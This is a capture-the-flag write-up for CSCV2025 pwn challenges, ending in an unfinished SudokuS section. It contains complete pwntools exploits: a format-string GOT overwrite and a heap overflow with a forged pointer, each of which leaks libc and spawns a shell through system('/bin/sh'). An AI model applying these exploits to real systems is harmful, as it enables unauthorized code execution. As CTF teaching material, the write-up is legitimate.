---
title: CSCV2025 - Pwn

---

# CSCV2025 - Pwn

## RacehorseS 
![ảnh](https://hackmd.io/_uploads/S1kbkfm0ee.png)

### Summary

**Sources:** [horse_say.zip](https://qual2.cscv.vn/files/646ccd11c5722a285edc936993ab6086/horse_say.zip?token=eyJ1c2VyX2lkIjo1OTI5LCJ0ZWFtX2lkIjoxMjQxLCJmaWxlX2lkIjo3MH0.aPWaAg.70NIT6vV5C5Pt2qZs-Rtt9bfH4k)

The binary contains a format-string vulnerability in `printf(s)` and **Partial RELRO**. Use a format-string to overwrite GOT entries. The goal is to get a shell by redirecting `strlen()` to `system()` and passing **"/bin/sh"**.

### Exploit

#### Allow multiple inputs

![ảnh](https://hackmd.io/_uploads/SycVez7Rlx.png)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 i; // [rsp+10h] [rbp-430h]
  unsigned __int64 j; // [rsp+18h] [rbp-428h]
  size_t v6; // [rsp+20h] [rbp-420h]
  size_t v7; // [rsp+28h] [rbp-418h]
  char s[1032]; // [rsp+30h] [rbp-410h] BYREF
  unsigned __int64 v9; // [rsp+438h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  memset(s, 0, 0x400u);
  printf("Say something: ");
  if ( fgets(s, 1024, stdin) )
  {
    v6 = strlen(s);
    if ( v6 && s[v6 - 1] == 10 )
      s[v6 - 1] = 0;
    v7 = strlen(s);
    if ( !v7 )
      strcpy(s, "(silence)");
    putchar(32);
    for ( i = 0; i < v7 + 2; ++i )
      putchar(95);
    printf("\n< ");
    printf(s);
    puts(" >");
    for ( j = 0; j < v7 + 2; ++j )
      putchar(45);
    putchar(10);
    puts("        \\   ^__^");
    puts("         \\  (oo)\\_______");
    puts("            (__)\\       )\\/\\");
    puts("                ||-----||");
    puts("                ||     ||");
    puts(&byte_402096);
    exit(0);
  }
  return 0;
}
```

![ảnh](https://hackmd.io/_uploads/rkUqbfmAge.png)

The program normally exits after one input. Overwrite `exit's GOT` entry to point to `main` so the program loops and accepts input repeatedly.

![ảnh](https://hackmd.io/_uploads/Sy9BffXCgx.png)

![ảnh](https://hackmd.io/_uploads/S1MeXG7Ceg.png)

```py
pl = b'%4829c%14$hn'
pl = pl.ljust(16, b'A')
pl += p64(0x404048)
sla("something: ", pl)
```

This writes the low 2 bytes to the target GOT address using **%hn**. After this the program returns to `main` instead of exiting.

#### Leak libc

![ảnh](https://hackmd.io/_uploads/BkaqXzQRel.png)

Leak an address from the stack to compute libc base. In this run the leak is `libc_start_call_main+122` at stack offset **281**.

```py
pl2 = b'%281$p'
sla("something: ", pl2)
```

Parse the leaked pointer and subtract the known offset to get **libc.base**. Then compute `system`.

![ảnh](https://hackmd.io/_uploads/r11H4M70lg.png)

#### Overwrite strlen GOT with system

`main()` calls `fgets()` then `strlen()`. Overwrite the GOT entry for `strlen` with the address of `system`. When `strlen(s)` is called with **s = "/bin/sh"**, `system("/bin/sh")` runs.

```c
 if ( fgets(s, 1024, stdin) )
  {
    v6 = strlen(s);
```

```py
pl3 = fmtstr_payload(12, {exe.got.strlen : system})
sla("something: ", pl3)
```

Before:
![ảnh](https://hackmd.io/_uploads/rkyNrzmRee.png)
After:
![ảnh](https://hackmd.io/_uploads/rJurBfQCgx.png)

#### Trigger shell

Send **/bin/sh** as the input. The overwritten GOT causes execution of `system("/bin/sh")`. Then interact with the shell and read the flag.

```py
#!/usr/bin/env python3

from pwn import *
import subprocess

exe = ELF('horse_say', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+118
        b*main+385
        b*main+551
               
        """)

if args.REMOTE:
    p = remote("pwn1.cscv.vn", int("6789"))
else:
    p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !

ru("work: ")
curl_cmd = rl().strip()
info(f'curl: {curl_cmd}')

try:
    sol = subprocess.check_output(curl_cmd.decode(), shell=True, executable="/bin/sh",
                                  stderr=subprocess.DEVNULL).strip()
    log.info(f"pow solution: {sol!r}")
    sla(b"solution: ", sol)
except subprocess.CalledProcessError:
    log.warning("Chạy curl|sh thất bại. Bạn có thể chạy thủ công trên máy local:")
    log.warning(curl_cmd.decode())


pl = b'%4829c%14$hn'
pl = pl.ljust(16, b'A')
pl += p64(0x404048)
sla("something: ", pl)

pl2 = b'%281$p'
sla("something: ", pl2)

ru('0x')
leak = r(12)
leak_addr = int(b'0x' + leak, 16)
info(f'leak addr: {hex(leak_addr)}')
libc.address = leak_addr - 0x2a1ca
info(f'libc base: {hex(libc.address)}')
system = libc.symbols['system']
info(f'system: {hex(system)}')

pl3 = fmtstr_payload(12, {exe.got.strlen : system})
sla("something: ", pl3)

sla("something: ", b'/bin/sh\x00')

sl('cat flag')

p.interactive()
```
#### Result

![ảnh](https://hackmd.io/_uploads/r1P2rz7Cle.png)

**Flag**
`CSCV2025{k1m1_n0_4184_64_2ukyun_d0kyun_h45h1r1d35h1}`

---

## Heap NoteS 
![ảnh](https://hackmd.io/_uploads/HJor1f7Agg.png)

### Summary

**Sources:** [heapnote.zip](https://qual2.cscv.vn/files/0b678065ca5b841889e58f183e3a9abc/heapnote.zip?token=eyJ1c2VyX2lkIjo1OTI5LCJ0ZWFtX2lkIjoxMjQxLCJmaWxlX2lkIjo3MX0.aPWbMg.aAIwUrqjDUg5h8ZqabaHy8ipTns)

**Vulnerabilities:**

Heap overflow in `write_note()` via `gets()` allows overwriting adjacent chunks.

`read_note()` does not validate indices, allowing memory leaks.

**Goal:** leak libc, overwrite GOT to call `system("/bin/sh")`, and retrieve the flag.

### Exploit

![ảnh](https://hackmd.io/_uploads/Sk7gJ7mAgg.png)

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setbuf(stdin, 0);
  setbuf(_bss_start, 0);
  setbuf(stderr, 0);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d%*c", &v3);
    if ( v3 == 4 )
      exit(0);
    if ( v3 > 4 )
    {
LABEL_12:
      puts("Wrong choice");
    }
    else
    {
      switch ( v3 )
      {
        case 3:
          write_note();
          break;
        case 1:
          create_note();
          break;
        case 2:
          read_note();
          break;
        default:
          goto LABEL_12;
      }
    }
  }
}

int create_note()
{
  __int64 i; // [rsp+0h] [rbp-10h]
  _QWORD *v2; // [rsp+8h] [rbp-8h]

  if ( g_note )
  {
    for ( i = g_note; *(_QWORD *)(i + 8); i = *(_QWORD *)(i + 8) )
      ;
    v2 = malloc(0x30u);
    *(_DWORD *)v2 = *(_DWORD *)i + 1;
    v2[1] = 0;
    *(_QWORD *)(i + 8) = v2;
    return printf("Note with index %u created\n", *(_DWORD *)v2);
  }
  else
  {
    g_note = (__int64)malloc(0x30u);
    *(_DWORD *)g_note = 0;
    *(_QWORD *)(g_note + 8) = 0;
    return puts("Note with index 0 created");
  }
}

unsigned __int64 read_note()
{
  int v1; // [rsp+Ch] [rbp-14h] BYREF
  __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( g_note )
  {
    v1 = 0;
    printf("Index: ");
    __isoc99_scanf("%u%*c", &v1);
    for ( i = g_note; *(_DWORD *)i != v1; i = *(_QWORD *)(i + 8) )
    {
      if ( !*(_QWORD *)(i + 8) )
        return v3 - __readfsqword(0x28u);
    }
    puts((const char *)(i + 16));
  }
  return v3 - __readfsqword(0x28u);
}

unsigned __int64 write_note()
{
  int v1; // [rsp+Ch] [rbp-14h] BYREF
  __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( g_note )
  {
    v1 = 0;
    printf("Index: ");
    __isoc99_scanf("%u%*c", &v1);
    for ( i = g_note; *(_DWORD *)i != v1; i = *(_QWORD *)(i + 8) )
    {
      if ( !*(_QWORD *)(i + 8) )
        return v3 - __readfsqword(0x28u);
    }
    gets(i + 16);
  }
  return v3 - __readfsqword(0x28u);
}
```

#### Leak libc by overwriting next pointer

Use the heap overflow to overwrite the next pointer of the next chunk. Set next = 0x404009. Calling `read_note(0x4010)` will read from 0x404009 + 16 = 0x404019, leaking a libc pointer (printf). From the leak, calculate libc base and system.

![ảnh](https://hackmd.io/_uploads/B1lA7QX0ex.png)

![ảnh](https://hackmd.io/_uploads/HkAR4X7Alg.png)

```py
payload = b'\x00' * 40     
payload += p64(0x41)
payload += p64(1)       
payload += p64(0x404008+1)     
write(0, payload)

read(0x4010)
```

![ảnh](https://hackmd.io/_uploads/r1mj4770xx.png)

#### Fake next pointer to GOT and overwrite with system

Next, fake the next pointer to 0x404010. Then `gets(i+16)` writes into 0x404020, which is the GOT entry for `gets`. Create a chunk containing **/bin/sh**:

```py
payload = b'/bin/sh\x00' + p64(0)*4 + p64(0x41) + p64(1) + p64(0x404010)
write(0, payload)
```
Overwrite the GOT entry with system:
```
write(libc.sym['setbuf'] & 0xffffffff, system)
```

Before:
![ảnh](https://hackmd.io/_uploads/HJLKrXmCle.png)
After:
![ảnh](https://hackmd.io/_uploads/SkcyU7QCeg.png)

After this, calling `gets()` triggers `system("/bin/sh")`.

#### Trigger shell and read flag

Call `write_note` function to execute `system("/bin/sh")`. Then read the flag.

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF('challenge_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+119

        """)

if args.REMOTE:
    p = remote("pwn2.cscv.vn", "3333")
else:
    p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !
def create():
    sla(b'> ', b'1')

def read(idx):
    sla(b'> ', b'2')
    slna(b'Index: ', idx)

def write(idx, content):
    sla(b'> ', b'3')
    slna(b'Index: ', idx)
    sl(content)

create()  
create()     

payload = b'\x00' * 40     
payload += p64(0x41)
payload += p64(1)       
payload += p64(0x404008+1)     
write(0, payload)

read(0x4010)

leak = rl()
printf_leak = (u64(leak.ljust(8,b'\x00')) & 0xffffffffff ) << 8
info(f'printf_leak: {hex(printf_leak)}')
libc.address = printf_leak - libc.sym['printf']
info(f'libc.address: {hex(libc.address)}')
system = p64(libc.sym['system'])
info(f'system: {hex(libc.sym["system"])}')

payload = b'/bin/sh\x00' + p64(0)*4 + p64(0x41) + p64(1) + p64(0x404010)
write(0, payload)

write(libc.sym['setbuf'] & 0xffffffff, system)

sla(b'> ', b'3')
slna(b'Index: ', b'0')
sl('cat flag.txt')

p.interactive()
```

#### Result

![ảnh](https://hackmd.io/_uploads/BJ1B87QAgx.png)

**Flag**
`CSCV2025{313487590c9dbf64bdd49d7e76980965}`

---

## SudokuS

![ảnh](https://hackmd.io/_uploads/HygyNMLAel.png)

### Summary

Sources: [public.zip](https://qual.cscv.vn/files/076f26ed2cf4d43cc49f6dc568752227/public.zip?token=eyJ1c2VyX2lkIjo1OTI5LCJ0ZWFtX2lkIjoxMjQxLCJmaWxlX2lkIjo3Mn0.aPiQ-w.fKhU_QvNAb1srL1Pn1C0iVuJAZk)

### Exploit

![ảnh](https://hackmd.io/_uploads/BynINfUAge.png)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+8h] [rbp-8h] BYREF
  int v5; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  init_sec_comp();
  puts("=== CSCV2025 - SudoShell ===");
  menu();
  printf("> ");
  v5 = __isoc99_scanf("%d", &choice);
  if ( v5 <= 0 )
  {
    perror("scanf failed");
    exit(1);
  }
  switch ( choice )
  {
    case 1:
      start_game();
      break;
    case 2:
      exit(0);
    case 3:
      help();
      break;
  }
  return 0;
}
```

Ta thấy có RWX Segments, khả năng là **ret2shellcode**. Ngoài ra chương trình còn có lớp bảo vệ **seccomp**:

![ảnh](https://hackmd.io/_uploads/HkEKdMICee.png)

